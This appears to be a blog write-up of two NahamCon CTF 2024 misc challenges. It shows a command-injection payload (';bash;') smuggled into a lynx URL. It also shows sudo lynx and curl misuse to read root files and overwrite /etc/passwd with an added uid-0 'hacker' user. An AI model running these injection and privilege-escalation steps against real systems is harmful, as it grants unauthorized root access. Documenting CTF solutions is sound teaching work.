+++
title = "NahamCon CTF 2024 WriteUp - Misc"
date = "2024-05-25T21:17:45+03:00"
author = ""
authorTwitter = "" #do not include @
tags = ["CTF", "Lynx", "Curl", "Passwd"]
keywords = ["", ""]
description = ""
showFullContent = false
readingTime = false
hideComments = false
color = "" #color from the theme settings
toc = true
cover = "/img/nahamcon_ctf_2024/logo.jpeg"
images = ["/img/nahamcon_ctf_2024/logo.jpeg"]
+++


## Introduction
NahamCon 2024 is taking place this weekend and they had a CTF as part of the online conference. I participated with team [fr334aks](https://twitter.com/fr334aks). 

We managed position 197. We did good on Web, Mobile and WarmUps but not well on other categories like Binary Exploitation and Crypto. 

{{< image src="/img/nahamcon_ctf_2024/cert.png" alt="" position="center" style="border-radius: 8px;" >}}

It was our first CTF of the year together, so it's not a bad start from a long break. Hopefully we get back to our winning ways :).

I only solved 2 challenges in Miscellaneous category that I am writing about in this post.


## 1. SecureSurfer

{{< image src="/img/nahamcon_ctf_2024/secure_surfer_1.png" alt="" position="center" style="border-radius: 8px;" >}}

We begin with ssh access to the challenge environment, we are also provided with [securesurfer.c](/files/nahamcon_ctf_2024/securesurfer.c) file. Our objective is to gain root access to get the flag.

{{< image src="/img/nahamcon_ctf_2024/secure_surfer_2.png" alt="" position="center" style="border-radius: 8px;" >}}

When we ssh, it seems the securesurfer program is executed and we are provided with a few options. 

If we look at the code provided, the only option that takes user input is option 6 which is a url that will be loaded using lynx browser on the terminal. 

We can see that the user input is not sanitized/validated, the only check done is that the url has to begin with `https://`.

{{< image src="/img/nahamcon_ctf_2024/secure_surfer_4.png" alt="" position="center" style="border-radius: 8px;" >}}

We can therefore inject our own commands to break out of the program and into a shell. After the url we can inject the below payload.

```sh
';bash;'
```
Once lynx program is done loading the url, we get a bash shell.

{{< image src="/img/nahamcon_ctf_2024/secure_surfer_3.png" alt="" position="center" style="border-radius: 8px;" >}}

To escalate our privileges, we find that the securesurfer user can run lynx as root.

{{< image src="/img/nahamcon_ctf_2024/secure_surfer_5.png" alt="" position="center" style="border-radius: 8px;" >}}

We can then try accessing the root folder using the below command.

```sh
sudo /usr/local/bin/lynx file:///root
```
{{< image src="/img/nahamcon_ctf_2024/secure_surfer_6.png" alt="" position="center" style="border-radius: 8px;" >}}

Here we see the get flag binary, we can then download it to our local directory and execute it to get the flag.

```sh
sudo /usr/local/bin/lynx -source file:///root/get_flag_random_suffix_21505252448959 > get_flag
```
{{< image src="/img/nahamcon_ctf_2024/secure_surfer_7.png" alt="" position="center" style="border-radius: 8px;" >}}

If we wanted to get a root shell, one way is to overwrite the passwd file to add a user with root privileges.

We'll begin by creating a password hash for the user we want to add to the passwd file, the password here is **hacker**.

```sh
openssl passwd -1 -salt hacker hacker
```
Then we'll copy the current passwd file to our directory and add our new user to the file, using the below format where we specify the user with id 0 to give root privileges. The username is **hacker**.

```sh
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' >> passwd
```

{{< image src="/img/nahamcon_ctf_2024/secure_surfer_8.png" alt="" position="center" style="border-radius: 8px;" >}}

Then we'll launch lynx and overwrite the /etc/passwd with our modified passwd file.

```sh
sudo /usr/local/bin/lynx file:///home/securesurfer/passwd
```
Once we are in lynx, we will press **P** which is the print option, and we select **Save to a local file** and press enter.

{{< image src="/img/nahamcon_ctf_2024/secure_surfer_9.png" alt="" position="center" style="border-radius: 8px;" >}}

We can then update the filename to /etc/passwd.

{{< image src="/img/nahamcon_ctf_2024/secure_surfer_10.png" alt="" position="center" style="border-radius: 8px;" >}}

Once we say yes to Overwrite the file, we can quit lynx and switch to the `hacker` user, using the password `hacker` to get a root shell.

{{< image src="/img/nahamcon_ctf_2024/secure_surfer_11.png" alt="" position="center" style="border-radius: 8px;" >}}


## 2. Curly Fries

{{< image src="/img/nahamcon_ctf_2024/curly_fries_1.png" alt="" position="center" style="border-radius: 8px;" >}}

For this challenge, we begin by ssh into the challenge environment. Our objective is to escalate to root and get the flag.

Our user has sudo privileges to run curl impersonating the user fry, however this configuration is not vulnerable to abuse.

{{< image src="/img/nahamcon_ctf_2024/curly_fries_2.png" alt="" position="center" style="border-radius: 8px;" >}}

Looking around, we find that in fry's home folder we can read the bash_history file. This gives us their password.

{{< image src="/img/nahamcon_ctf_2024/curly_fries_3.png" alt="" position="center" style="border-radius: 8px;" >}}

Switching to the user fry, we see they can run curl as root but the configuration includes a wildcard. This is different from the previous configuration and we can abuse it.

{{< image src="/img/nahamcon_ctf_2024/curly_fries_4.png" alt="" position="center" style="border-radius: 8px;" >}}

Similar to the previous challenge, we'll use curl to overwrite the passwd file with a modified version that has the hacker user with root privileges.

I set up a python web server to serve the modified passwd file and then downloaded it and perform the overwrite.

```sh
sudo /usr/bin/curl 127.0.0.1:8000/health-check -o /etc/passwd
```

{{< image src="/img/nahamcon_ctf_2024/curly_fries_5.png" alt="" position="center" style="border-radius: 8px;" >}}

## Conclusion
Thanks to John Hammond, NahamSec and the rest of challenge creators for putting together yet another great CTF this year. I didn't put in a lot of time to solve more challenges but I still had a good time.

You can catch the conference live here: [NahamCon CTF 2024 Live Stream](https://www.youtube.com/live/76mNNVVBht0?si=E2TKu8fJD6SNXFCR)

